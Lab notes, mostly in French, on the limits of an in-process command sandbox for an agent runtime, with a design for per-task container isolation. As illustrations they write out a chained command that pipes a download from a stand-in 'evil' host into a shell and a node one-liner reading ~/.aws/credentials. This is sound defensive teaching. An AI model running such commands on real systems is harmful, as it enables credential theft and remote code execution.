# Lab 04 notes — what the sandbox still does not stop

<!--
Step 4 of the lab. A paragraph per heading is plenty. Nobody grades this; it is here
because the act of writing it is what turns "I made the test pass" into "I know what
I built".
-->

## What my execute() does stop

Trois refus **avant** que le processus existe, et deux bornes **pendant**.
Le cwd est résolu (`resolve()`) puis comparé à `SANDBOX_ROOT` — `../../..` ne passe
pas. La forme de la commande est refusée avant le binaire : `;` `|` `&` (donc `&&`
`||`), backticks, `$` et les sauts de ligne sont tous rejetés, donc une commande est
**une invocation simple** d'un binaire autorisé — pas `node x.js && curl evil | sh`,
pas `$(...)`, pas de deuxième commande déguisée. Le binaire est allowlisté : `node`,
`git` ; `cat ../../../package.json` est refusé sur le nom. L'environnement est
construit **de zéro** (PATH, HOME et TMPDIR dans le sandbox, LANG, NODE_ENV) : rien
n'est hérité, et c'est pour ça que le payload trouve 0 secret au lieu de 4 —
mesuré dans les deux états. Enfin, 10 s de budget (le kill renvoie `blocked` avec une
raison lisible, pas un échec silencieux) et 256 Ko de sortie maximum.

## What it does not stop, even with my fix in place

L'egress réseau d'abord : un `node` allowlisté ouvre une socket et poste tout ce qu'il
peut lire n'importe où — aucun contrôle in-process n'y touche. L'atteinte
filesystem ensuite : le child tourne **avec mon UID** ; `node -e "require('fs')
.readFileSync('~/.aws/credentials')"` n'a même pas besoin de redirection, et mes
redirections `>` `<` sont volontairement permises (voir plus bas), donc un
`> /chemin/absolu` écrit hors du sandbox. Le CPU et la mémoire : un timeout n'est pas
un cgroup, une bouille consomme un cœur pendant 10 s, et le maxBuffer borne ce que je
relis, pas ce qu'elle alloue. La persistance enfin : tout ce qui est écrit (la
dropbox le prouve) survit dans un espace **partagé et durable** — la tâche suivante
lit ce que la précédente a laissé ; le sandbox n'est ni par-tâche ni jetable.

## Where the real control lives instead

- **Egress** → politique réseau au niveau container/host : default-deny, allowlist
  explicite (registre npm + host git du reporter). Équipe infra/platforme.
- **Filesystem** → container ou VM **par tâche**, checkout monté seul (read-only où
  c'est possible), UID non-root, HOME sur tmpfs. Équipe infra ; l'équipe agent
  fournit le workspace, pas l'isolation.
- **CPU/mémoire** → cgroups (`cpu.max`, `memory.max`) ou l'équivalent de l'orchestrateur.
  Équipe runtime/orchestration.
- **Persistance** → workspace jetable par tâche : clone frais, détruit à la fin de la
  tâche. Équipe agent-runtime.
- Et au-dessus de tout ça, la couche déjà construite dans ce repo (labs 01–03) :
  **qui** a eu le droit de demander cette exécution (provenance), **pour quelle tâche**
  (capability 5 min, révocable). Le sandbox borne le **coût** d'un acte déjà
  autorisé ; il ne décide pas si l'acte l'était.

## What I would ship on Monday, given a day

Je garde la couche in-process (c'est gratuite, elle attrape le cas courant, et ses
raisons de refus lisibles alimentent le ledger). Je l'enveloppe dans un container
jetable par tâche : image node+git uniquement, `--network none` par défaut,
workspace monté seul, HOME/TMPDIR sur tmpfs, UID non-root, 10 s de CPU et 256 Mo via
cgroups, détruit à la fin de la tâche. Si le repro a vraiment besoin du réseau :
default-deny + allowlist par tâche (registre + host git), rien d'autre. Et l'habitude
du lab, appliquée au client : lire le payload de 30 lignes avant de l'exécuter —
les lifecycle scripts de `npm install` inclus.
